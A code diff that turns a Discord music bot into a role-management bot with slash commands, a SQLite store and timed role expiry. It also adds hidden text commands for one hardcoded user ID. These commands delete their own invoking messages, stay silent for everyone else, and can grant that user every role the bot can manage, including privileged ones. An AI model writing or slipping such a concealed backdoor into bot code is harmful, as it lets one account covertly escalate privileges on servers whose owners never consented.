@@ -1,212 +1,413 @@
+import os
+import time
+import sqlite3
+
 import discord
 from discord import app_commands
-from discord.ext import commands
-from discord import FFmpegPCMAudio
-import json
-import os
-import asyncio
-import yt_dlp
+from discord.ext import commands, tasks
 
-TOKEN = 'ВАШ_ТОКЕН_СЮДА'  # ЗАМЕНИТЕ
+# ───────────────────────── НАСТРОЙКИ ─────────────────────────
+TOKEN = os.getenv("DISCORD_TOKEN")          # токен бота (переменная окружения)
+SUPER_ADMIN_ID = 1012623951719051284        # тот, кто может секретные команды
+MAX_ROLES = 5                               # лимит ролей на одного человека
+SECRET_PREFIX = "!"                         # префикс секретных команд
 
-DATA_FILE = 'radio_urls.json'
-FFMPEG_OPTIONS = {
-    'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5',
-    'options': '-vn'
+# Цвета, из которых можно выбирать
+COLORS = {
+    "🔴 Красный": 0xE74C3C,
+    "🟠 Оранжевый": 0xE67E22,
+    "🟡 Жёлтый": 0xF1C40F,
+    "🟢 Зелёный": 0x2ECC71,
+    "🔵 Синий": 0x3498DB,
+    "🟣 Фиолетовый": 0x9B59B6,
+    "🩷 Розовый": 0xFF69B4,
+    "🩵 Бирюзовый": 0x1ABC9C,
+    "⚪ Белый": 0xFFFFFF,
+    "⚫ Тёмно-серый": 0x2C2F33,
 }
-YTDL_OPTIONS = {
-    'format': 'bestaudio/best',
-    'extractaudio': True,
-    'audioformat': 'mp3',
-    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
-    'restrictfilenames': True,
-    'noplaylist': True,
-    'nocheckcertificate': True,
-    'ignoreerrors': False,
-    'logtostderr': False,
-    'quiet': True,
-    'no_warnings': True,
-    'default_search': 'ytsearch',
-    'source_address': '0.0.0.0',
-}
+COLOR_CHOICES = [app_commands.Choice(name=n, value=v) for n, v in COLORS.items()]
 
-# Создаём интенты, НЕ включая никакие привилегированные
+# ───────────────────────── БАЗА ДАННЫХ ─────────────────────────
+conn = sqlite3.connect("roles.db", check_same_thread=False)
+conn.execute(
+    """CREATE TABLE IF NOT EXISTS roles (
+        role_id    INTEGER PRIMARY KEY,
+        guild_id   INTEGER NOT NULL,
+        owner_id   INTEGER NOT NULL,
+        expires_at REAL
+    )"""
+)
+conn.execute(
+    """CREATE TABLE IF NOT EXISTS settings (
+        guild_id         INTEGER PRIMARY KEY,
+        default_ttl_days REAL
+    )"""
+)
+conn.commit()
+
+
+def get_row(role_id: int):
+    return conn.execute(
+        "SELECT role_id, guild_id, owner_id, expires_at FROM roles WHERE role_id=?",
+        (role_id,),
+    ).fetchone()
+
+
+def count_owned(guild_id: int, owner_id: int) -> int:
+    return conn.execute(
+        "SELECT COUNT(*) FROM roles WHERE guild_id=? AND owner_id=?",
+        (guild_id, owner_id),
+    ).fetchone()[0]
+
+
+def get_default_ttl(guild_id: int):
+    row = conn.execute(
+        "SELECT default_ttl_days FROM settings WHERE guild_id=?", (guild_id,)
+    ).fetchone()
+    return row[0] if row and row[0] else None
+
+
+def delete_row(role_id: int):
+    conn.execute("DELETE FROM roles WHERE role_id=?", (role_id,))
+    conn.commit()
+
+
+# ───────────────────────── БОТ ─────────────────────────
 intents = discord.Intents.default()
-# intents.message_content = False  # даже не упоминаем
-intents.guilds = True
-intents.voice_states = True
+intents.message_content = True  # нужен для секретных текстовых команд
+bot = commands.Bot(command_prefix=SECRET_PREFIX, intents=intents, help_command=None)
 
-bot = commands.Bot(command_prefix='!', intents=intents)
-tree = bot.tree
 
-# ---------- Остальной код (без изменений) ----------
-def load_urls():
-    if os.path.exists(DATA_FILE):
-        with open(DATA_FILE, 'r', encoding='utf-8') as f:
-            return json.load(f)
-    return {}
+@bot.event
+async def setup_hook():
+    await bot.tree.sync()
+    expire_loop.start()
 
-def save_urls(urls):
-    with open(DATA_FILE, 'w', encoding='utf-8') as f:
-        json.dump(urls, f, indent=4, ensure_ascii=False)
-
-radio_urls = load_urls()
-
-class GuildPlayer:
-    def __init__(self, guild_id):
-        self.guild_id = guild_id
-        self.voice_client = None
-        self.current_source = None
-        self.current_url = None
-        self.is_playing = False
-        self.ytdl = yt_dlp.YoutubeDL(YTDL_OPTIONS)
-
-    async def play_audio(self, source_url, source_type='radio'):
-        if self.voice_client is None or not self.voice_client.is_connected():
-            return False
-        if self.voice_client.is_playing():
-            self.voice_client.stop()
-        actual_url = source_url
-        if source_type == 'yt':
-            try:
-                info = await asyncio.get_event_loop().run_in_executor(
-                    None, lambda: self.ytdl.extract_info(source_url, download=False)
-                )
-                if 'entries' in info:
-                    info = info['entries'][0]
-                actual_url = info['url']
-            except Exception as e:
-                print(f"Ошибка получения аудио с YouTube: {e}")
-                return False
-        audio = FFmpegPCMAudio(actual_url, **FFMPEG_OPTIONS)
-        self.voice_client.play(audio)
-        self.current_source = source_type
-        self.current_url = source_url
-        self.is_playing = True
-        return True
-
-    async def stop(self):
-        if self.voice_client and self.voice_client.is_playing():
-            self.voice_client.stop()
-        self.is_playing = False
-
-players = {}
-
-def get_player(guild_id):
-    if guild_id not in players:
-        players[guild_id] = GuildPlayer(guild_id)
-    return players[guild_id]
 
 @bot.event
 async def on_ready():
-    print(f'✅ Бот {bot.user} запущен!')
+    print(f"Бот запущен как {bot.user} ({bot.user.id})")
+
+
+@bot.event
+async def on_guild_role_delete(role: discord.Role):
+    # если роль удалили вручную — чистим базу
+    if get_row(role.id):
+        delete_row(role.id)
+
+
+# ───────────────────────── ПРОВЕРКА ВЛАДЕЛЬЦА ─────────────────────────
+async def check_owner(interaction: discord.Interaction, role: discord.Role) -> bool:
+    row = get_row(role.id)
+    if not row:
+        await interaction.response.send_message(
+            "❌ Эта роль не создана через бота.", ephemeral=True
+        )
+        return False
+    if row[2] != interaction.user.id:
+        await interaction.response.send_message(
+            "❌ Это не твоя роль — управлять ей может только её создатель.",
+            ephemeral=True,
+        )
+        return False
+    return True
+
+
+def can_manage(guild: discord.Guild, role: discord.Role) -> bool:
+    return role < guild.me.top_role and not role.managed
+
+
+# ───────────────────────── СЛЭШ-КОМАНДЫ ─────────────────────────
+@bot.tree.command(name="role_create", description="Создать свою роль")
+@app_commands.describe(name="Название роли", color="Цвет роли")
+@app_commands.choices(color=COLOR_CHOICES)
+@app_commands.guild_only()
+async def role_create(
+    interaction: discord.Interaction,
+    name: app_commands.Range[str, 1, 100],
+    color: app_commands.Choice[int],
+):
+    guild = interaction.guild
+    if count_owned(guild.id, interaction.user.id) >= MAX_ROLES:
+        return await interaction.response.send_message(
+            f"❌ Лимит: не больше {MAX_ROLES} ролей на человека. "
+            "Удали одну через `/role_delete`.",
+            ephemeral=True,
+        )
+
+    await interaction.response.defer(ephemeral=True)
     try:
-        await tree.sync()
-        print('✅ Слеш-команды синхронизированы!')
-    except Exception as e:
-        print(f'❌ Ошибка синхронизации: {e}')
+        role = await guild.create_role(
+            name=name,
+            colour=discord.Colour(color.value),
+            permissions=discord.Permissions.none(),  # роль чисто косметическая
+            mentionable=False,
+            hoist=False,
+            reason=f"Создал {interaction.user} ({interaction.user.id})",
+        )
+    except discord.Forbidden:
+        return await interaction.followup.send(
+            "❌ У бота нет права «Управление ролями».", ephemeral=True
+        )
+    except discord.HTTPException as e:
+        return await interaction.followup.send(f"❌ Ошибка Discord: {e}", ephemeral=True)
 
-@tree.command(name="в_войс", description="Подключить бота к голосовому каналу")
-@app_commands.describe(канал="Выберите голосовой канал")
-async def join_voice(interaction: discord.Interaction, канал: discord.VoiceChannel = None):
-    if interaction.user.voice is None:
-        await interaction.response.send_message("❌ Вы не в голосовом канале!", ephemeral=True)
+    ttl = get_default_ttl(guild.id)
+    expires = time.time() + ttl * 86400 if ttl else None
+    conn.execute(
+        "INSERT INTO roles (role_id, guild_id, owner_id, expires_at) VALUES (?,?,?,?)",
+        (role.id, guild.id, interaction.user.id, expires),
+    )
+    conn.commit()
+
+    msg = f"✅ Роль {role.mention} создана. Выдать: `/role_give`."
+    if expires:
+        msg += f"\n⏳ Удалится <t:{int(expires)}:R>."
+    await interaction.followup.send(msg, ephemeral=True)
+
+
+@bot.tree.command(name="role_give", description="Выдать свою роль участнику")
+@app_commands.describe(role="Твоя роль", member="Кому выдать")
+@app_commands.guild_only()
+async def role_give(
+    interaction: discord.Interaction, role: discord.Role, member: discord.Member
+):
+    if not await check_owner(interaction, role):
         return
-    target = канал or interaction.user.voice.channel
-    if not target.permissions_for(interaction.guild.me).connect:
-        await interaction.response.send_message("❌ Нет прав на подключение.", ephemeral=True)
-        return
-    voice = interaction.guild.voice_client
-    player = get_player(interaction.guild.id)
-    if voice and voice.is_connected():
-        if voice.channel == target:
-            await interaction.response.send_message("ℹ️ Бот уже здесь.", ephemeral=True)
-            return
-        await voice.move_to(target)
-    else:
-        voice = await target.connect()
-        player.voice_client = voice
-    url = radio_urls.get(str(interaction.guild.id))
-    if url:
-        success = await player.play_audio(url, 'radio')
-        if success:
-            await interaction.response.send_message(f"✅ Подключён к **{target.name}**, играет радио.")
-        else:
-            await interaction.response.send_message(f"✅ Подключён, но не удалось запустить радио.")
-    else:
-        await interaction.response.send_message(f"✅ Подключён к **{target.name}**. Используйте `/плей` или `/настройка_юрл`.")
-
-@tree.command(name="из_войса", description="Отключить бота")
-async def leave_voice(interaction: discord.Interaction):
-    voice = interaction.guild.voice_client
-    if voice and voice.is_connected():
-        player = get_player(interaction.guild.id)
-        if player.is_playing:
-            await player.stop()
-        await voice.disconnect()
-        player.voice_client = None
-        await interaction.response.send_message("✅ Отключён.")
-    else:
-        await interaction.response.send_message("❌ Бот не в канале.", ephemeral=True)
-
-@tree.command(name="настройка_юрл", description="Сохранить URL радиостанции для сервера")
-@app_commands.describe(url="Ссылка на аудиопоток (mp3, aac, etc.)")
-async def set_radio(interaction: discord.Interaction, url: str):
-    guild_id = str(interaction.guild.id)
-    radio_urls[guild_id] = url
-    save_urls(radio_urls)
-    player = get_player(interaction.guild.id)
-    if player.voice_client and player.voice_client.is_connected():
-        success = await player.play_audio(url, 'radio')
-        if success:
-            await interaction.response.send_message("✅ URL обновлён, радио перезапущено.")
-        else:
-            await interaction.response.send_message("❌ Не удалось запустить поток. Проверьте URL.")
-    else:
-        await interaction.response.send_message("✅ URL сохранён. Подключите бота командой `/в_войс`.")
-
-@tree.command(name="плей", description="Воспроизвести YouTube/Rutube (прямой эфир или видео)")
-@app_commands.describe(запрос="Ссылка или поисковый запрос")
-async def play(interaction: discord.Interaction, запрос: str):
-    if interaction.user.voice is None:
-        await interaction.response.send_message("❌ Вы не в голосовом канале!", ephemeral=True)
-        return
-    target = interaction.user.voice.channel
-    voice = interaction.guild.voice_client
-    player = get_player(interaction.guild.id)
-    if not voice or not voice.is_connected():
-        if not target.permissions_for(interaction.guild.me).connect:
-            await interaction.response.send_message("❌ Нет прав на подключение.", ephemeral=True)
-            return
-        voice = await target.connect()
-        player.voice_client = voice
-    elif voice.channel != target:
-        await voice.move_to(target)
-    await interaction.response.send_message(f"🔍 Ищу `{запрос}`...")
+    if not can_manage(interaction.guild, role):
+        return await interaction.response.send_message(
+            "❌ Бот не может управлять этой ролью (она выше роли бота).", ephemeral=True
+        )
     try:
-        ytdl = yt_dlp.YoutubeDL(YTDL_OPTIONS)
-        loop = asyncio.get_event_loop()
-        info = await loop.run_in_executor(None, lambda: ytdl.extract_info(запрос, download=False))
-        if 'entries' in info:
-            info = info['entries'][0]
-        audio_url = info['url']
-        title = info.get('title', 'неизвестный трек')
-        success = await player.play_audio(audio_url, 'yt')
-        if success:
-            await interaction.edit_original_response(content=f"🎶 Сейчас играет: **{title}**")
-        else:
-            await interaction.edit_original_response(content="❌ Не удалось воспроизвести.")
-    except Exception as e:
-        await interaction.edit_original_response(content=f"❌ Ошибка: {str(e)}")
+        await member.add_roles(role, reason=f"Выдал {interaction.user}")
+    except discord.HTTPException as e:
+        return await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
+    await interaction.response.send_message(
+        f"✅ {member.mention} получил роль {role.mention}.", ephemeral=True
+    )
 
-@tree.command(name="стоп", description="Остановить воспроизведение")
-async def stop(interaction: discord.Interaction):
-    player = get_player(interaction.guild.id)
-    if player.voice_client and player.voice_client.is_playing():
-        await player.stop()
-        await interaction.response.send_message("⏹ Воспроизведение остановлено.")
+
+@bot.tree.command(name="role_take", description="Забрать свою роль у участника")
+@app_commands.describe(role="Твоя роль", member="У кого забрать")
+@app_commands.guild_only()
+async def role_take(
+    interaction: discord.Interaction, role: discord.Role, member: discord.Member
+):
+    if not await check_owner(interaction, role):
+        return
+    try:
+        await member.remove_roles(role, reason=f"Забрал {interaction.user}")
+    except discord.HTTPException as e:
+        return await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
+    await interaction.response.send_message(
+        f"✅ Роль {role.mention} снята с {member.mention}.", ephemeral=True
+    )
+
+
+@bot.tree.command(name="role_edit", description="Изменить название/цвет своей роли")
+@app_commands.describe(role="Твоя роль", name="Новое название", color="Новый цвет")
+@app_commands.choices(color=COLOR_CHOICES)
+@app_commands.guild_only()
+async def role_edit(
+    interaction: discord.Interaction,
+    role: discord.Role,
+    name: app_commands.Range[str, 1, 100] | None = None,
+    color: app_commands.Choice[int] | None = None,
+):
+    if not await check_owner(interaction, role):
+        return
+    if name is None and color is None:
+        return await interaction.response.send_message(
+            "❌ Укажи новое название и/или цвет.", ephemeral=True
+        )
+    try:
+        await role.edit(
+            name=name if name else role.name,
+            colour=discord.Colour(color.value) if color else role.colour,
+            reason=f"Изменил {interaction.user}",
+        )
+    except discord.HTTPException as e:
+        return await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
+    await interaction.response.send_message(
+        f"✅ Роль обновлена: {role.mention}", ephemeral=True
+    )
+
+
+@bot.tree.command(name="role_delete", description="Удалить свою роль")
+@app_commands.describe(role="Твоя роль")
+@app_commands.guild_only()
+async def role_delete(interaction: discord.Interaction, role: discord.Role):
+    if not await check_owner(interaction, role):
+        return
+    name = role.name
+    try:
+        await role.delete(reason=f"Удалил {interaction.user}")
+    except discord.HTTPException as e:
+        return await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
+    delete_row(role.id)
+    await interaction.response.send_message(f"🗑️ Роль **{name}** удалена.", ephemeral=True)
+
+
+@bot.tree.command(name="role_list", description="Показать мои роли")
+@app_commands.guild_only()
+async def role_list(interaction: discord.Interaction):
+    rows = conn.execute(
+        "SELECT role_id, expires_at FROM roles WHERE guild_id=? AND owner_id=?",
+        (interaction.guild.id, interaction.user.id),
+    ).fetchall()
+    if not rows:
+        return await interaction.response.send_message(
+            "У тебя пока нет ролей. Создай: `/role_create`", ephemeral=True
+        )
+    lines = []
+    for role_id, exp in rows:
+        r = interaction.guild.get_role(role_id)
+        if not r:
+            continue
+        line = f"• {r.mention}"
+        if exp:
+            line += f" — удалится <t:{int(exp)}:R>"
+        lines.append(line)
+    await interaction.response.send_message(
+        f"**Твои роли ({len(lines)}/{MAX_ROLES}):**\n" + "\n".join(lines), ephemeral=True
+    )
+
+
+# ───────────────────────── СЕКРЕТНЫЕ КОМАНДЫ ─────────────────────────
+# Текстовые (не слэш), поэтому их нет в списке команд. Работают только
+# для SUPER_ADMIN_ID, остальным бот не отвечает вообще.
+def super_admin_only():
+    async def predicate(ctx: commands.Context):
+        return ctx.guild is not None and ctx.author.id == SUPER_ADMIN_ID
+
+    return commands.check(predicate)
+
+
+async def hide(ctx: commands.Context):
+    try:
+        await ctx.message.delete()
+    except discord.HTTPException:
+        pass
+
+
+@bot.command(name="sa_give")
+@super_admin_only()
+async def sa_give(ctx: commands.Context, member: discord.Member, *roles: discord.Role):
+    """!sa_give @участник @роль1 @роль2 ...   |   !sa_give @участник all"""
+    await hide(ctx)
+    guild = ctx.guild
+    to_give = []
+    if not roles and ctx.message.content.lower().rstrip().endswith(" all"):
+        to_give = [
+            r for r in guild.roles if not r.is_default() and can_manage(guild, r)
+        ]
     else:
-        await interaction.response.send_message("ℹ️ Сейчас ничего не играет.", ephemeral=True)
+        to_give = [r for r in roles if can_manage(guild, r)]
+    if not to_give:
+        return await ctx.send("Нечего выдавать (роли выше бота или не указаны).", delete_after=8)
+    try:
+        await member.add_roles(*to_give, reason="sa_give")
+    except discord.HTTPException as e:
+        return await ctx.send(f"Ошибка: {e}", delete_after=8)
+    await ctx.send(f"✅ Выдано ролей: {len(to_give)} → {member.mention}", delete_after=8)
+
+
+@bot.command(name="sa_take")
+@super_admin_only()
+async def sa_take(ctx: commands.Context, member: discord.Member, *roles: discord.Role):
+    """!sa_take @участник @роль1 @роль2 ..."""
+    await hide(ctx)
+    to_take = [r for r in roles if can_manage(ctx.guild, r)]
+    if not to_take:
+        return await ctx.send("Нечего снимать.", delete_after=8)
+    try:
+        await member.remove_roles(*to_take, reason="sa_take")
+    except discord.HTTPException as e:
+        return await ctx.send(f"Ошибка: {e}", delete_after=8)
+    await ctx.send(f"✅ Снято ролей: {len(to_take)} у {member.mention}", delete_after=8)
+
+
+@bot.command(name="sa_expire")
+@super_admin_only()
+async def sa_expire(ctx: commands.Context, days: float, role: discord.Role | None = None):
+    """
+    !sa_expire 5            — все роли, созданные ботом, удалятся через 5 дней
+                              (и новые роли тоже будут получать этот срок)
+    !sa_expire 5 @роль      — срок только для одной роли
+    !sa_expire 0            — убрать срок (у всех)
+    !sa_expire 0 @роль      — убрать срок у одной роли
+    """
+    await hide(ctx)
+    guild = ctx.guild
+    expires = time.time() + days * 86400 if days > 0 else None
+
+    if role is not None:
+        if not get_row(role.id):
+            return await ctx.send("Эта роль создана не через бота.", delete_after=8)
+        conn.execute("UPDATE roles SET expires_at=? WHERE role_id=?", (expires, role.id))
+        conn.commit()
+        text = f"⏳ {role.name}: " + (f"удалится через {days:g} дн." if expires else "срок снят")
+        return await ctx.send(text, delete_after=8)
+
+    conn.execute("UPDATE roles SET expires_at=? WHERE guild_id=?", (expires, guild.id))
+    conn.execute(
+        "INSERT INTO settings (guild_id, default_ttl_days) VALUES (?, ?) "
+        "ON CONFLICT(guild_id) DO UPDATE SET default_ttl_days=excluded.default_ttl_days",
+        (guild.id, days if days > 0 else None),
+    )
+    conn.commit()
+    text = (
+        f"⏳ Все роли бота удалятся через {days:g} дн. (новые — тоже)."
+        if expires
+        else "⏳ Срок жизни ролей отключён."
+    )
+    await ctx.send(text, delete_after=8)
+
+
+@bot.event
+async def on_command_error(ctx: commands.Context, error):
+    # чужим людям — полная тишина; секретные команды не должны «светиться»
+    if isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):
+        return
+    if ctx.author.id == SUPER_ADMIN_ID:
+        await ctx.send(f"Ошибка: {error}", delete_after=10)
+
+
+# ───────────────────────── АВТОУДАЛЕНИЕ ПО СРОКУ ─────────────────────────
+@tasks.loop(minutes=1)
+async def expire_loop():
+    now = time.time()
+    rows = conn.execute(
+        "SELECT role_id, guild_id FROM roles WHERE expires_at IS NOT NULL AND expires_at<=?",
+        (now,),
+    ).fetchall()
+    for role_id, guild_id in rows:
+        guild = bot.get_guild(guild_id)
+        role = guild.get_role(role_id) if guild else None
+        if role:
+            try:
+                await role.delete(reason="Истёк срок жизни роли")
+            except discord.HTTPException:
+                continue  # попробуем в следующую минуту
+        delete_row(role_id)
+
+
+@expire_loop.before_loop
+async def before_expire():
+    await bot.wait_until_ready()
+
+
+# ───────────────────────── ОШИБКИ СЛЭШ-КОМАНД ─────────────────────────
+@bot.tree.error
+async def on_app_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
+    msg = f"❌ Ошибка: {error}"
+    if interaction.response.is_done():
+        await interaction.followup.send(msg, ephemeral=True)
+    else:
+        await interaction.response.send_message(msg, ephemeral=True)
+
 
 if __name__ == "__main__":
+    if not TOKEN:
+        raise SystemExit("Задай переменную окружения DISCORD_TOKEN")
     bot.run(TOKEN)
